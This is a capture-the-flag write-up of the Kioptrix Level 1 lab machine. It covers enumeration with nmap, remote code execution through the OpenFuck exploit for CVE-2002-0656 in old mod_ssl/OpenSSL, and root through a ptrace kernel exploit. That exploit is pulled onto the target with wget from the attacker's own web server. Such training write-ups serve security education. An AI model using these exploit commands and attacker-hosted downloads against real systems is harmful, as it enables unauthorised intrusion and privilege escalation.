# Kioptrix: Level 1 (#1) - Capture the Flag Writeup

A complete walkthrough of the Kioptrix Level 1 CTF challenge, demonstrating remote code execution via a legacy OpenSSL vulnerability and local privilege escalation using a kernel exploit.

## 🎯 Target Overview
* **OS:** Red-Hat Linux 7.2 (Kernel 2.4.7-10)
* **IP Address:** 192.168.0.23
* **Difficulty:** Beginner

---

## 🔍 Stage 1: Enumeration & Scanning
An initial Nmap scan was performed to identify open ports and services:

```bash
nmap -sV -A 192.168.0.23
```

### Key Findings:
* **Port 443/tcp:** Apache 1.3.20 / mod_ssl 2.8.4 / OpenSSL 0.9.6b

The version of OpenSSL in use is extremely old and known to be vulnerable to a heap overflow protocol flaw.

---

## 🚀 Stage 2: Exploitation (Initial Access)
The vulnerability identified corresponds to **CVE-2002-0656** (vulnerability handling SSLv2 client keys). The **OpenFuck** exploit source code was used to target this service.

### 🛠️ Compilation Hurdles:
Compiling legacy code on modern Kali Linux threw deprecated library warnings. However, compilation completed successfully using:

```bash
gcc -o OpenFuck OpenFuck.c -lcrypto
```

### 💥 Execution:
The initial attempt using architecture offset `0x6a` failed and crashed the connection. After reviewing the available targets inside the exploit, the second RedHat 7.2 profile (**`0x6b`**) was chosen:

```bash
./OpenFuck 0x6b 192.168.0.23 443 -c 40
```

**Result:** Successfully established a low-privilege interactive shell as the `apache` user.

```bash
bash-2.05\$ whoami
apache
```

---

## 📈 Stage 3: Local Privilege Escalation (Root)
With low-privilege access established, the system environment was profiled:

```bash
bash-2.05\$ uname -a
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
```

The system was found running Linux Kernel **2.4.7-10**, which is vulnerable to a ptrace race condition local privilege escalation flaw (**CVE-2003-0127**).

### 📂 File Transfer:
Because the target lacked modern SSL capabilities to download directly from external sites like Pastebin, a local Python HTTP server was launched on the attacker's Kali machine:

```bash
# On Kali Host
python3 -m http.server 80
```

The exploit (`ptrace.c`) was then pulled to the target's `/tmp` directory, compiled, and executed:

```bash
# On Target Shell
cd /tmp
wget http://<KALI_IP>/ptrace.c
gcc -o ptrace ptrace.c
./ptrace
```

### ⚡ Triggering the Root Hook:
The exploit required an SUID execution to trigger the privilege hook. Running a simple `ping` forced the kernel shift:

```bash
ping localhost -c 2
```

**Result:** Privilege escalation successful!

```bash
bash-2.05\$ whoami
root
```

---

## 🏁 Flag Capture
The final confirmation flag was uncovered by checking the root account's local mail spool (`/var/spool/mail/root`):

> **"If you are reading this, you got root. Congratulations. Level 2 won't be as easy..."**

🎉 **Machine 100% Compromised.**
